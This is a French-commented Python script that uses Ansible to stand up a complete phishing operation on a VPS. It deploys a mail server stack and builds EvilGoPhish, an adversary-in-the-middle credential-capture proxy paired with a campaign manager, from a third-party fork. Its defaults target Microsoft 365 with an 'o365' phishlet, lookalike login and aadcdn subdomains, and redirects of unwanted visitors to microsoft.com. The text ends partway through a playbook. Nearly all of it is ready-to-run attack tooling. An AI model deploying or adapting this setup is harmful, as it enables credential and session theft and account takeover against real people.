#!/usr/bin/env python3
"""
deploy_infra.py
───────────────
Déploiement automatisé de l'infrastructure phishing sur un nouveau VPS via Ansible.
Stack déployée : MariaDB · Dovecot · Postfix · PostfixAdmin · Roundcube · EvilGoPhish

Usage : python3 deploy_infra.py [-c deploy_config.yml] [--dry-run] [--step STEP]
        python3 deploy_infra.py --list-steps
"""

import argparse
import base64
import json
import os
import shutil
import subprocess
import sys
import tempfile
import re
import textwrap
import time
import traceback
from pathlib import Path
from datetime import datetime
from typing import Optional

try:
    import yaml
except ImportError:
    print("[ERROR] PyYAML requis : pip3 install pyyaml", file=sys.stderr)
    sys.exit(1)

# ══════════════════════════════════════════════════════════════════════════════
#  COULEURS & LOGGER
# ══════════════════════════════════════════════════════════════════════════════

class C:
    RST  = "\033[0m"
    BOLD = "\033[1m"
    DIM  = "\033[2m"
    RED  = "\033[91m"
    GRN  = "\033[92m"
    YLW  = "\033[93m"
    BLU  = "\033[94m"
    MAG  = "\033[95m"
    CYN  = "\033[96m"
    WHT  = "\033[97m"


_log_path: Path | None = None


def _ts() -> str:
    return datetime.now().strftime("%H:%M:%S")


def log_info(msg: str):
    print(f"{C.DIM}{_ts()}{C.RST} {C.BLU}[•]{C.RST} {msg}")


def log_ok(msg: str):
    print(f"{C.DIM}{_ts()}{C.RST} {C.GRN}[✔]{C.RST} {C.GRN}{msg}{C.RST}")


def log_warn(msg: str):
    print(f"{C.DIM}{_ts()}{C.RST} {C.YLW}[⚠]{C.RST} {C.YLW}{msg}{C.RST}")


def log_error(msg: str):
    print(f"{C.DIM}{_ts()}{C.RST} {C.RED}[✘]{C.RST} {C.RED}{msg}{C.RST}", file=sys.stderr)


def log_step(n: int, total: int, title: str):
    bar = f"[{n}/{total}]"
    print(f"\n{C.CYN}{C.BOLD}{'─'*64}{C.RST}")
    print(f"{C.CYN}{C.BOLD}  {bar}  {title}{C.RST}")
    print(f"{C.CYN}{C.BOLD}{'─'*64}{C.RST}")


def die(msg: str, exit_code: int = 1):
    log_error(msg)
    sys.exit(exit_code)


# ══════════════════════════════════════════════════════════════════════════════
#  CHARGEMENT & VALIDATION DE LA CONFIG
# ══════════════════════════════════════════════════════════════════════════════

class Config:
    def __init__(self, path: str):
        self.path = Path(path)
        if not self.path.exists():
            die(f"Fichier de config introuvable : {path}")
        with open(self.path) as f:
            self._raw = yaml.safe_load(f)

    def get(self, *keys, default=None):
        v = self._raw
        for k in keys:
            if not isinstance(v, dict):
                return default
            v = v.get(k, default)
            if v is default:
                return default
        return v

    def require(self, *keys):
        v = self.get(*keys)
        if v is None or v == "" or str(v).startswith("CHANGE_ME"):
            die(f"Paramètre manquant ou non configuré : {'.'.join(keys)}")
        return v

    def validate(self):
        errors = []

        is_local = self.local

        required_fields = [
            ("vps", "host"), ("vps", "user"),
            ("domain",), ("vps_ip",),
            ("ssl", "cert_local"), ("ssl", "key_local"),
        ]
        if not is_local:
            required_fields.append(("vps", "ssh_key"))

        for field in required_fields:
            v = self.get(*field)
            if not v or str(v).startswith("CHANGE_ME") or v in ("1.2.3.4",):
                errors.append(f"  • {'.'.join(field)} : non configuré (valeur : {v!r})")

        if not is_local:
            ssh_key = self.get("vps", "ssh_key", default="")
            if ssh_key and not Path(ssh_key).exists():
                errors.append(f"  • vps.ssh_key : fichier introuvable ({ssh_key})")

        if self.get("mail", "deploy", default=True):
            for f in ("mail.db_root_password", "mail.db_password",
                      "mail.postfixadmin_admin_password"):
                parts = f.split(".")
                v = self.get(*parts, default="")
                if str(v).startswith("CHANGE_ME"):
                    errors.append(f"  • {f} : non configuré")

            des_key = self.get("mail", "roundcube_des_key", default="")
            if len(des_key) != 24:
                errors.append(f"  • mail.roundcube_des_key : doit faire exactement 24 caractères (actuel: {len(des_key)})")

            ssl_cert = self.get("ssl", "cert_local", default="")
            ssl_key  = self.get("ssl", "key_local",  default="")
            if ssl_cert and not Path(ssl_cert).exists():
                errors.append(f"  • ssl.cert_local : fichier introuvable ({ssl_cert})")
            if ssl_key and not Path(ssl_key).exists():
                errors.append(f"  • ssl.key_local : fichier introuvable ({ssl_key})")

        if errors:
            log_error("Erreurs de configuration :")
            for e in errors:
                print(f"  {C.RED}{e}{C.RST}", file=sys.stderr)
            die("Corrigez deploy_config.yml et relancez.")

        log_ok("Configuration validée")

    # ── Accesseurs pratiques ──────────────────────────────────────────────────

    @property
    def vps_host(self):    return self.get("vps", "host")
    @property
    def vps_user(self):    return self.get("vps", "user", default="root")
    @property
    def ssh_key(self):     return self.get("vps", "ssh_key")
    @property
    def ssh_port(self):    return self.get("vps", "ssh_port", default=22)
    @property
    def domain(self):      return self.get("domain")
    @property
    def vps_ip(self):      return self.get("vps_ip")
    @property
    def subdomains(self):  return self.get("subdomains", default=["login", "auth", "aadcdn", "account", "www"])
    @property
    def ssl_cert(self):    return self.get("ssl", "cert_local")
    @property
    def ssl_key(self):     return self.get("ssl", "key_local")
    @property
    def mail_deploy(self): return self.get("mail", "deploy", default=True)
    @property
    def eg_deploy(self):   return self.get("evilgophish", "deploy", default=True)
    @property
    def dry_run(self):     return self.get("options", "dry_run", default=False)
    @property
    def verbose(self):     return self.get("options", "verbose", default=False)
    @property
    def local(self):       return self.get("options", "local", default=False)
    @property
    def net(self):         return self.get("docker", "network", default="phishing-net")
    @property
    def subnet(self):      return self.get("docker", "subnet", default="10.10.0.0/24")
    @property
    def ips(self):         return self.get("docker", "ips", default={})

    _IP_DEFAULTS = {
        "smtp":         "10.10.0.3",
        "maildb":       "10.10.0.12",
        "dovecot":      "10.10.0.10",
        "postfixadmin": "10.10.0.13",
        "roundcube":    "10.10.0.11",
        "evilgophish":  "10.10.0.6",
    }

    def ip(self, service: str) -> str:
        """Returns IP for a docker service, from docker.ips in config yaml."""
        val = self.ips.get(service)
        if val:
            return val
        fallback = self._IP_DEFAULTS.get(service)
        if fallback:
            log_warn(f"docker.ips.{service} absent du config — fallback sur {fallback}")
            return fallback
        die(f"IP inconnue pour le service docker '{service}'")
    @property
    def mail_dir(self):    return self.get("mail", "dir", default="/opt/mailstack")
    @property
    def smtp_dir(self):    return self.get("mail", "smtp_dir", default="/opt/smtp")
    @property
    def eg_dir(self):      return self.get("evilgophish", "dir", default="/opt/evilgophish")

    @property
    def repo_local(self) -> Optional[Path]:
        rel = self.get("repos", "local")
        if not rel:
            return None
        p = self.path.parent / rel
        return p if p.exists() else None

    @property
    def use_local_repos(self) -> bool:
        return self.repo_local is not None


# ══════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ══════════════════════════════════════════════════════════════════════════════

def _make_repo_archive(src: Path, dst: Path):
    """Create a tar.gz of a repo directory, excluding .git and __pycache__."""
    import tarfile
    dst.parent.mkdir(parents=True, exist_ok=True)
    with tarfile.open(dst, "w:gz") as tar:
        for item in sorted(src.rglob("*")):
            rel = item.relative_to(src)
            parts = rel.parts
            if any(p in (".git", "__pycache__") for p in parts):
                continue
            tar.add(item, arcname=str(rel))


# ══════════════════════════════════════════════════════════════════════════════
#  GÉNÉRATEURS DE FICHIERS DE CONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════

def gen_mariadb_init(c: Config) -> str:
    db   = c.get("mail", "db_name", default="mailserver")
    user = c.get("mail", "db_user", default="mailuser")
    pw   = c.get("mail", "db_password", default="")
    return f"""\
CREATE DATABASE IF NOT EXISTS roundcube CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;
GRANT ALL PRIVILEGES ON roundcube.* TO '{user}'@'%' IDENTIFIED BY '{pw}';
FLUSH PRIVILEGES;
"""


def gen_dovecot_dockerfile(_: Config) -> str:
    return """\
FROM debian:bookworm-slim
RUN apt-get update && apt-get install -y --no-install-recommends \\
        dovecot-core dovecot-imapd dovecot-lmtpd dovecot-mysql ca-certificates && \\
    rm -rf /var/lib/apt/lists/* && \\
    groupadd -g 5000 vmail && \\
    useradd -g vmail -u 5000 vmail -d /var/mail && \\
    mkdir -p /var/mail/vhosts && \\
    chown -R vmail:vmail /var/mail
CMD ["dovecot", "-F"]
"""


def gen_dovecot_conf(_: Config) -> str:
    return """\
protocols = imap lmtp
log_path = /dev/stderr
info_log_path = /dev/stdout
debug_log_path = /dev/stdout
!include conf.d/*.conf
"""


def gen_dovecot_sql(c: Config) -> str:
    db    = c.get("mail", "db_name", default="mailserver")
    user  = c.get("mail", "db_user", default="mailuser")
    pw    = c.get("mail", "db_password", default="")
    ip_db = c.ip("maildb")
    return f"""\
driver = mysql
connect = host={ip_db} dbname={db} user={user} password={pw}
default_pass_scheme = SHA512-CRYPT
password_query = SELECT password FROM mailbox WHERE username = '%u' AND active = 1
user_query = SELECT '/var/mail/vhosts/%d/%n' AS home, 'maildir:/var/mail/vhosts/%d/%n' AS mail, 5000 AS uid, 5000 AS gid FROM mailbox WHERE username = '%u' AND active = 1
"""


def gen_conf_10_auth(_: Config) -> str:
    return """\
auth_mechanisms = plain login
disable_plaintext_auth = no
!include auth-sql.conf.ext
"""


def gen_conf_10_mail(_: Config) -> str:
    return """\
mail_location = maildir:/var/mail/vhosts/%d/%n
mail_uid = 5000
mail_gid = 5000
namespace inbox {
  inbox = yes
}
"""


def gen_conf_10_master(_: Config) -> str:
    return """\
service imap-login {
  inet_listener imap {
    port = 143
  }
}

service lmtp {
  inet_listener lmtp {
    address = *
    port = 24
  }
}

service auth {
  unix_listener auth-userdb {
    mode = 0600
  }
}
"""


def gen_conf_20_lmtp(c: Config) -> str:
    domain = c.domain
    return f"""\
protocol lmtp {{
  postmaster_address = postmaster@{domain}
}}
"""


def gen_auth_sql(_: Config) -> str:
    return """\
passdb {
  driver = sql
  args = /etc/dovecot/dovecot-sql.conf.ext
}
userdb {
  driver = sql
  args = /etc/dovecot/dovecot-sql.conf.ext
}
"""


def gen_postfixadmin_php_ini() -> str:
    return "error_reporting = E_ALL & ~E_DEPRECATED & ~E_NOTICE & ~E_WARNING\ndisplay_errors = Off\n"


def gen_roundcube_config(c: Config) -> str:
    key  = c.get("mail", "roundcube_des_key", default="")
    return f"""\
<?php
    $config['plugins'] = [];
    $config['log_driver'] = 'stdout';
    $config['zipdownload_selection'] = true;
    $config['des_key'] = '{key}';
    $config['enable_spellcheck'] = true;
    $config['spellcheck_engine'] = 'pspell';
    include(__DIR__ . '/config.docker.inc.php');
    $config['smtp_user'] = '';
    $config['smtp_pass'] = '';
"""


def gen_postfix_lookup(c: Config, query: str) -> str:
    db   = c.get("mail", "db_name", default="mailserver")
    user = c.get("mail", "db_user", default="mailuser")
    pw   = c.get("mail", "db_password", default="")
    ip   = c.ip("maildb")
    return f"""\
user = {user}
password = {pw}
hosts = {ip}
dbname = {db}
query = {query}
"""


def gen_mailstack_compose(c: Config) -> str:
    d    = c.mail_dir
    net  = c.net
    db   = c.get("mail", "db_name", default="mailserver")
    user = c.get("mail", "db_user", default="mailuser")
    pw   = c.get("mail", "db_password", default="")
    root = c.get("mail", "db_root_password", default="")
    rc_pw = c.get("mail", "roundcube_db_password", default=pw)
    port_rc  = c.get("mail", "port_roundcube", default=8025)
    port_pfa = c.get("mail", "port_postfixadmin", default=8026)
    return f"""\
services:
  maildb:
    image: mariadb:10.11
    container_name: maildb
    restart: unless-stopped
    environment:
      MYSQL_ROOT_PASSWORD: "{root}"
      MYSQL_DATABASE: "{db}"
      MYSQL_USER: "{user}"
      MYSQL_PASSWORD: "{pw}"
    volumes:
      - maildb_data:/var/lib/mysql
      - {d}/mysql/init.sql:/docker-entrypoint-initdb.d/init.sql:ro
    networks:
      {net}:
        ipv4_address: {c.ip("maildb")}

  dovecot:
    build:
      context: {d}/dovecot
      dockerfile: Dockerfile
    image: dovecot-custom:local
    container_name: dovecot
    restart: unless-stopped
    volumes:
      - {d}/dovecot/dovecot.conf:/etc/dovecot/dovecot.conf:ro
      - {d}/dovecot/conf.d:/etc/dovecot/conf.d:ro
      - {d}/dovecot/dovecot-sql.conf.ext:/etc/dovecot/dovecot-sql.conf.ext:ro
      - maildata:/var/mail/vhosts
    networks:
      {net}:
        ipv4_address: {c.ip("dovecot")}
    depends_on:
      - maildb

  postfixadmin:
    image: postfixadmin:latest
    container_name: postfixadmin
    restart: unless-stopped
    environment:
      - POSTFIXADMIN_DB_TYPE=mysqli
      - POSTFIXADMIN_DB_HOST={c.ip("maildb")}
      - POSTFIXADMIN_DB_USER={user}
      - POSTFIXADMIN_DB_PASSWORD={pw}
      - POSTFIXADMIN_DB_NAME={db}
      - POSTFIXADMIN_SMTP_SERVER=smtp
      - POSTFIXADMIN_SMTP_PORT=587
      - POSTFIXADMIN_ENCRYPT=crypt
    volumes:
      - {d}/postfixadmin-php.ini:/usr/local/etc/php/conf.d/99-postfixadmin.ini:ro
    ports:
      - "127.0.0.1:{port_pfa}:80"
    depends_on:
      - maildb
    networks:
      {net}:
        ipv4_address: {c.ip("postfixadmin")}

  roundcube:
    image: roundcube/roundcubemail:latest
    container_name: roundcube
    restart: unless-stopped
    environment:
      - ROUNDCUBEMAIL_DB_TYPE=mysql
      - ROUNDCUBEMAIL_DB_HOST={c.ip("maildb")}
      - ROUNDCUBEMAIL_DB_USER={user}
      - ROUNDCUBEMAIL_DB_PASSWORD={pw}
      - ROUNDCUBEMAIL_DB_NAME=roundcube
      - ROUNDCUBEMAIL_DEFAULT_HOST={c.ip("dovecot")}
      - ROUNDCUBEMAIL_DEFAULT_PORT=143
      - ROUNDCUBEMAIL_SMTP_SERVER={c.ip("smtp")}
      - ROUNDCUBEMAIL_SMTP_PORT=587
      - ROUNDCUBEMAIL_SMTP_USER=
      - ROUNDCUBEMAIL_SMTP_PASS=
    volumes:
      - {d}/roundcube-config/config.inc.php:/var/www/html/config/config.inc.php:ro
    ports:
      - "0.0.0.0:{port_rc}:80"
    depends_on:
      - maildb
      - dovecot
    networks:
      {net}:
        ipv4_address: {c.ip("roundcube")}

volumes:
  maildb_data:
  maildata:

networks:
  {net}:
    external: true
"""


def gen_smtp_compose(c: Config) -> str:
    domain    = c.domain
    s         = c.smtp_dir
    net       = c.net
    port_smtp = c.get("mail", "port_smtp", default=25)
    return f"""\
services:
  smtp:
    image: boky/postfix:latest
    container_name: smtp
    restart: unless-stopped
    dns:
      - 8.8.8.8
      - 1.1.1.1
    environment:
      - TZ=Europe/Paris
      - ALLOWED_SENDER_DOMAINS={domain}
      - RELAYHOST=
      - DKIM_AUTOGENERATE=true
      - POSTFIX_myhostname=mail.{domain}
      - POSTFIX_mydomain={domain}
      - POSTFIX_virtual_mailbox_domains=mysql:/etc/postfix/mysql/virtual-domains.cf
      - POSTFIX_virtual_mailbox_maps=mysql:/etc/postfix/mysql/virtual-mailboxes.cf
      - POSTFIX_virtual_alias_maps=mysql:/etc/postfix/mysql/virtual-aliases.cf
      - POSTFIX_virtual_transport=lmtp:inet:{c.ip("dovecot")}:24
      - POSTFIX_smtpd_sender_restrictions=permit_mynetworks,permit_sasl_authenticated
      - POSTFIX_smtpd_client_restrictions=permit_mynetworks,permit_sasl_authenticated
      - POSTFIX_smtpd_recipient_restrictions=permit_mynetworks,reject_non_fqdn_recipient,reject_unknown_recipient_domain,reject_unauth_destination
    ports:
      - "0.0.0.0:{port_smtp}:25"
    volumes:
      - smtp_data:/var/spool/postfix
      - {s}/dkim:/etc/opendkim/keys
      - {s}/mysql:/etc/postfix/mysql
    networks:
      {net}:
        ipv4_address: {c.ip("smtp")}

volumes:
  smtp_data:

networks:
  {net}:
    external: true
"""


def gen_evilgophish_compose(c: Config) -> str:
    eg  = c.eg_dir
    net = c.net
    rid = c.get("evilgophish", "rid_param", default="rid")
    return f"""\
services:
  evilgophish:
    image: evilgophish:local
    container_name: evilgophish
    restart: unless-stopped
    build:
      context: {eg}/build
      dockerfile: Dockerfile
      args:
        RID_PARAM: "{rid}"
    environment:
      - EVILGINX_DOMAIN={c.domain}
      - EVILGINX_EXTERNAL_IP={c.vps_ip}
      - EVILGOPHISH_FEED=true
    ports:
      - "0.0.0.0:443:443"
      - "0.0.0.0:80:8880"
      - "127.0.0.1:3333:3333"
      - "127.0.0.1:1337:1337"
      - "53:53/tcp"
      - "53:53/udp"
    volumes:
      - {eg}/evilginx-config:/root/.evilginx
      - {eg}/data/gophish.db:/opt/evilgophish/gophish/gophish.db
      - {eg}/data/evilgophish.db:/opt/evilgophish/gophish/evilgophish.db
      - {eg}/data/config.json:/opt/evilgophish/gophish/config.json:ro
      - {eg}/phishlets:/opt/evilgophish/evilginx3/phishlets
      - {eg}/redirectors:/opt/evilgophish/evilginx3/redirectors
      - {eg}/logs:/var/log/evilgophish
    networks:
      {net}:
        ipv4_address: {c.ip("evilgophish")}

networks:
  {net}:
    external: true
"""


def gen_evilgophish_dockerfile(c: Config) -> str:
    if c.use_local_repos:
        src_block = "COPY repo_src/ ."
        apt_pkgs = "make libpcap-dev gcc"
    else:
        src_block = """\
RUN git clone https://github.com/fin3ss3g0d/evilgophish.git .
RUN rm -rf evilginx3 && git clone https://github.com/Yomgui33/evil_temp.git evilginx3"""
        apt_pkgs = "git make libpcap-dev gcc"
    return f"""\
FROM golang:1.21-bookworm AS builder
ARG RID_PARAM=rid

RUN apt-get update && apt-get install -y --no-install-recommends \\
    {apt_pkgs} && rm -rf /var/lib/apt/lists/*

WORKDIR /build

{src_block}

RUN mkdir -p evilginx3/legacy_phishlets evilginx3/redirectors evilfeed

RUN if [ "${{RID_PARAM}}" != "rid" ]; then \\
    find . -name "*.go" | xargs grep -l '"rid"' 2>/dev/null | \\
    xargs sed -i "s/\\"rid\\"/${{RID_PARAM}}/g"; fi

RUN find evilginx3 -name "*.go" | xargs grep -rl "GenerateKey.*1024" 2>/dev/null | \\
    xargs sed -i "s/GenerateKey(rand.Reader, 1024)/GenerateKey(rand.Reader, 2048)/g" || true

RUN cd evilginx3 && if [ -d vendor ]; then go build -mod=vendor -o evilginx3 .; \\
    else go build -o evilginx3 .; fi && echo "[+] evilginx3 built"
RUN cd gophish    && go build -o gophish . && echo "[+] gophish built"
RUN cd evilfeed   && (go build -o evilfeed . 2>/dev/null && echo "[+] evilfeed built" || \\
    (echo "[!] evilfeed build skipped" && touch evilfeed))

FROM ubuntu:22.04
RUN apt-get update && apt-get install -y \\
    libpcap-dev supervisor ca-certificates net-tools curl iproute2 \\
    && rm -rf /var/lib/apt/lists/*

COPY --from=builder /build/evilginx3/evilginx3    /opt/evilgophish/evilginx3/
COPY --from=builder /build/evilginx3/legacy_phishlets/   /opt/evilgophish/evilginx3/phishlets-bundled/
COPY --from=builder /build/evilginx3/redirectors/ /opt/evilgophish/evilginx3/redirectors-bundled/
COPY --from=builder /build/gophish/               /opt/evilgophish/gophish/
COPY --from=builder /build/evilfeed/evilfeed      /opt/evilgophish/evilfeed/
RUN rm -f /opt/evilgophish/gophish/config.json

COPY supervisord.conf /etc/supervisor/conf.d/evilgophish.conf
COPY entrypoint.sh    /entrypoint.sh
RUN chmod +x /opt/evilgophish/evilginx3/evilginx3 \\
             /opt/evilgophish/gophish/gophish \\
             /opt/evilgophish/evilfeed/evilfeed \\
             /entrypoint.sh

EXPOSE 443 80 53/udp 3333 1337
ENTRYPOINT ["/entrypoint.sh"]
"""


def gen_supervisord(_: Config) -> str:
    return """\
[supervisord]
nodaemon=true
logfile=/var/log/evilgophish/supervisord.log
pidfile=/var/run/supervisord.pid
loglevel=info

[unix_http_server]
file=/var/run/supervisor.sock

[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface

[supervisorctl]
serverurl=unix:///var/run/supervisor.sock

[program:evilginx3]
command=/opt/evilgophish/evilginx3/evilginx3 -c /root/.evilginx -p /opt/evilgophish/evilginx3/phishlets -t /opt/evilgophish/evilginx3/redirectors -g /opt/evilgophish/gophish/gophish.db
directory=/opt/evilgophish/gophish
autostart=true
autorestart=true
startretries=5
stdout_logfile=/var/log/evilgophish/evilginx3.log
stderr_logfile=/var/log/evilgophish/evilginx3.log

[program:gophish]
command=/opt/evilgophish/gophish/gophish
directory=/opt/evilgophish/gophish
autostart=true
autorestart=true
startretries=5
stdout_logfile=/var/log/evilgophish/gophish.log
stderr_logfile=/var/log/evilgophish/gophish.log

[program:evilfeed]
command=/opt/evilgophish/evilfeed/evilfeed
directory=/opt/evilgophish/evilfeed
autostart=false
autorestart=true
startretries=3
stdout_logfile=/var/log/evilgophish/evilfeed.log
stderr_logfile=/var/log/evilgophish/evilfeed.log
"""


def gen_entrypoint(_: Config) -> str:
    return """\
#!/bin/bash
set -e
mkdir -p /var/log/evilgophish
touch /var/log/evilgophish/evilginx3.log \\
      /var/log/evilgophish/gophish.log   \\
      /var/log/evilgophish/evilfeed.log
exec /usr/bin/supervisord -c /etc/supervisor/supervisord.conf
"""


def gen_gophish_config(_: Config) -> str:
    return json.dumps({
        "admin_server": {
            "listen_url": "0.0.0.0:3333",
            "use_tls": False,
            "cert_path": "gophish_admin.crt",
            "key_path": "gophish_admin.key"
        },
        "phish_server": {
            "listen_url": "0.0.0.0:8880",
            "use_tls": False,
            "cert_path": "example.crt",
            "key_path": "example.key"
        },
        "db_name": "sqlite3",
        "db_path": "gophish.db",
        "migrations_prefix": "db/db_",
        "contact_address": "",
        "logging": {"filename": "", "level": ""}
    }, indent=2)


def gen_evilginx_config(c: Config) -> str:
    return json.dumps({
        "general": {
            "domain":        c.domain,
            "external_ipv4": c.vps_ip,
            "bind_ipv4":     "",
            "https_port":    443,
            "http_port":     8880,
            "dns_port":      53,
            "autocert":      False,
            "unauth_url":    c.get("evilgophish", "unauth_url", default="https://www.microsoft.com"),
        },
        "blacklist": {"mode": "off"},
        "phishlets": {},
        "lures": [],
    }, indent=2)


def gen_activate_phishlet(c: Config) -> str:
    phishlet = c.get("evilgophish", "phishlet", default="o365")
    hostname = c.get("evilgophish", "phishlet_hostname", default=f"login.{c.domain}")
    lure     = c.get("evilgophish", "lure_path", default="/secure")
    redirect = c.get("evilgophish", "unauth_url", default="https://www.microsoft.com")
    return f"""\
import json, sys

PHISHLET = '{phishlet}'
HOSTNAME = '{hostname}'
REDIRECT = '{redirect}'
LURE_PATH = '{lure}'
CFG_PATH = '/root/.evilginx/config.json'

with open(CFG_PATH) as f:
    cfg = json.load(f)

for k in cfg.get('phishlets', {{}}):
    cfg['phishlets'][k] = {{'hostname': '', 'unauth_url': '', 'enabled': False, 'visible': False}}

cfg.setdefault('phishlets', {{}})[PHISHLET] = {{
    'hostname': HOSTNAME, 'unauth_url': '', 'enabled': True, 'visible': True
}}

cfg.setdefault('lures', []).append({{
    'path': LURE_PATH, 'phishlet': PHISHLET, 'redirect_url': REDIRECT,
    'paused': 0, 'hostname': '', 'id': '', 'info': '',
    'og_desc': '', 'og_image': '', 'og_title': '', 'og_url': '',
    'redirector': '', 'ua_filter': ''
}})

with open(CFG_PATH, 'w') as f:
    json.dump(cfg, f, indent=2)
print(f'[+] Phishlet {{PHISHLET}} activé | lure: {{LURE_PATH}}')
"""


# ══════════════════════════════════════════════════════════════════════════════
#  GÉNÉRATION DES FICHIERS ANSIBLE
# ══════════════════════════════════════════════════════════════════════════════

class AnsibleWorkspace:
    """Gère le répertoire temporaire contenant tous les artefacts Ansible."""

    def __init__(self, c: Config):
        self.c   = c
        self.dir = Path(tempfile.mkdtemp(prefix="deploy_infra_"))
        self.files_dir = self.dir / "files"
        self.files_dir.mkdir()
        log_info(f"Workspace Ansible : {self.dir}")

    def cleanup(self):
        shutil.rmtree(self.dir, ignore_errors=True)

    def write(self, rel_path: str, content: str) -> Path:
        p = self.dir / rel_path
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
        return p

    def write_file(self, name: str, content: str) -> Path:
        """Écrit un fichier dans files/ (sera copié sur le VPS par Ansible)."""
        p = self.files_dir / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
        return p

    def inventory(self) -> str:
        c = self.c
        if c.local:
            return self.write("inventory.ini", """\
[vps]
target ansible_connection=local
""")
        return self.write("inventory.ini", f"""\
[vps]
target ansible_host={c.vps_host} ansible_user={c.vps_user} ansible_port={c.ssh_port} ansible_ssh_private_key_file={c.ssh_key} ansible_ssh_common_args='-o StrictHostKeyChecking=no'
""")

    def prepare_files(self):
        """Génère tous les fichiers de config qui seront copiés sur le VPS."""
        c = self.c

        # ── SSL certs ────────────────────────────────────────────────────────
        if c.ssl_cert:
            shutil.copy2(c.ssl_cert, self.files_dir / "origin.crt")
        if c.ssl_key:
            shutil.copy2(c.ssl_key, self.files_dir / "origin.key")

        # ── Mail stack ───────────────────────────────────────────────────────
        if c.mail_deploy:
            self.write_file("mail/init.sql",                   gen_mariadb_init(c))
            self.write_file("mail/dovecot/Dockerfile",         gen_dovecot_dockerfile(c))
            self.write_file("mail/dovecot/dovecot.conf",       gen_dovecot_conf(c))
            self.write_file("mail/dovecot/dovecot-sql.conf.ext", gen_dovecot_sql(c))
            self.write_file("mail/dovecot/conf.d/10-auth.conf",   gen_conf_10_auth(c))
            self.write_file("mail/dovecot/conf.d/10-mail.conf",   gen_conf_10_mail(c))
            self.write_file("mail/dovecot/conf.d/10-master.conf", gen_conf_10_master(c))
            self.write_file("mail/dovecot/conf.d/20-lmtp.conf",   gen_conf_20_lmtp(c))
            self.write_file("mail/dovecot/conf.d/auth-sql.conf.ext", gen_auth_sql(c))
            self.write_file("mail/roundcube-config/config.inc.php", gen_roundcube_config(c))
            self.write_file("mail/postfixadmin-php.ini",            gen_postfixadmin_php_ini())
            self.write_file("mail/smtp/mysql/virtual-domains.cf",
                gen_postfix_lookup(c, "SELECT 1 FROM domain WHERE domain='%s' AND active = 1"))
            self.write_file("mail/smtp/mysql/virtual-mailboxes.cf",
                gen_postfix_lookup(c, "SELECT maildir FROM mailbox WHERE username='%s' AND active = 1"))
            self.write_file("mail/smtp/mysql/virtual-aliases.cf",
                gen_postfix_lookup(c, "SELECT goto FROM alias WHERE address='%s' AND active = 1"))
            self.write_file("mail/mailstack-compose.yml", gen_mailstack_compose(c))
            self.write_file("mail/smtp-compose.yml",      gen_smtp_compose(c))

        # ── EvilGoPhish ──────────────────────────────────────────────────────
        if c.eg_deploy:
            self.write_file("evilgophish/build/Dockerfile",      gen_evilgophish_dockerfile(c))
            self.write_file("evilgophish/build/supervisord.conf", gen_supervisord(c))
            self.write_file("evilgophish/build/entrypoint.sh",    gen_entrypoint(c))
            self.write_file("evilgophish/evilginx-config/config.json", gen_evilginx_config(c))
            self.write_file("evilgophish/data/config.json",       gen_gophish_config(c))
            self.write_file("evilgophish/docker-compose.yml",     gen_evilgophish_compose(c))
            self.write_file("evilgophish/activate_phishlet.py",   gen_activate_phishlet(c))
            if c.use_local_repos:
                log_info("Archivage du repo local pour le build Docker…")
                _make_repo_archive(c.repo_local,
                                   self.files_dir / "evilgophish/build/repo_src.tar.gz")
                log_ok("Archive créée : repo_src.tar.gz")


# ══════════════════════════════════════════════════════════════════════════════
#  PLAYBOOKS ANSIBLE (un par étape)
# ══════════════════════════════════════════════════════════════════════════════

def pb_preflight() -> str:
    return """\
---
- name: "Preflight — connectivité VPS"
  hosts: vps
  gather_facts: false
  tasks:
    - name: Ping
      ansible.builtin.ping:

    - name: Vérifier OS (Ubuntu/Debian)
      ansible.builtin.raw: "lsb_release -si"
      register: os_id
      changed_when: false

    - name: Afficher OS détecté
      ansible.builtin.debug:
        msg: "OS: {{ os_id.stdout | trim }}"
"""


def pb_docker() -> str:
    return """\
---
- name: "Docker — installation"
  hosts: vps
  gather_facts: true
  tasks:
    - name: Paquets requis
      ansible.builtin.apt:
        name: [ca-certificates, curl, gnupg, lsb-release, python3-pip]
        state: present
        update_cache: true

    - name: Clé GPG Docker
      ansible.builtin.shell: |
        install -m 0755 -d /etc/apt/keyrings
        curl -fsSL https://download.docker.com/linux/ubuntu/gpg | \\
          gpg --dearmor -o /etc/apt/keyrings/docker.gpg
        chmod a+r /etc/apt/keyrings/docker.gpg
      args:
        creates: /etc/apt/keyrings/docker.gpg

    - name: Repo Docker
      ansible.builtin.shell: |
        echo "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.gpg] \\
          https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable" > \\
          /etc/apt/sources.list.d/docker.list
      args:
        creates: /etc/apt/sources.list.d/docker.list

    - name: Installer Docker Engine + Compose plugin
      ansible.builtin.apt:
        name: [docker-ce, docker-ce-cli, containerd.io, docker-compose-plugin]
        state: present
        update_cache: true

    - name: Démarrer Docker
      ansible.builtin.service:
        name: docker
        state: started
        enabled: true

    - name: Vérifier docker version
      ansible.builtin.command: docker --version
      register: docker_ver
      changed_when: false

    - name: Afficher version
      ansible.builtin.debug:
        msg: "{{ docker_ver.stdout }}"
"""


def pb_structure(c: Config, files_dir: Path) -> str:
    d   = c.mail_dir
    s   = c.smtp_dir
    eg  = c.eg_dir
    net = c.net
    sub = c.subnet
    return f"""\
---
- name: "Structure — répertoires + réseau Docker + SSL"
  hosts: vps
  gather_facts: false
  tasks:
    - name: Créer répertoires mail
      ansible.builtin.file:
        path: "{{{{ item }}}}"
        state: directory
        mode: "0755"
      loop:
        - {d}
        - {d}/mysql
        - {d}/dovecot
        - {d}/dovecot/conf.d
        - {d}/roundcube-config
        - {s}
        - {s}/dkim
        - {s}/mysql

    - name: Créer répertoires evilgophish
      ansible.builtin.file:
        path: "{{{{ item }}}}"
        state: directory
        mode: "0755"
      loop:
        - {eg}
        - {eg}/build
        - {eg}/evilginx-config/crt/sites
        - {eg}/data
        - {eg}/phishlets
        - {eg}/redirectors
        - {eg}/logs

    - name: Créer gophish.db et evilgophish.db comme fichiers vides (éviter création par Docker comme répertoire)
      ansible.builtin.shell: |
        touch {eg}/data/gophish.db
        touch {eg}/data/evilgophish.db
      changed_when: false

    - name: Créer /root/SSL
      ansible.builtin.file:
        path: /root/SSL
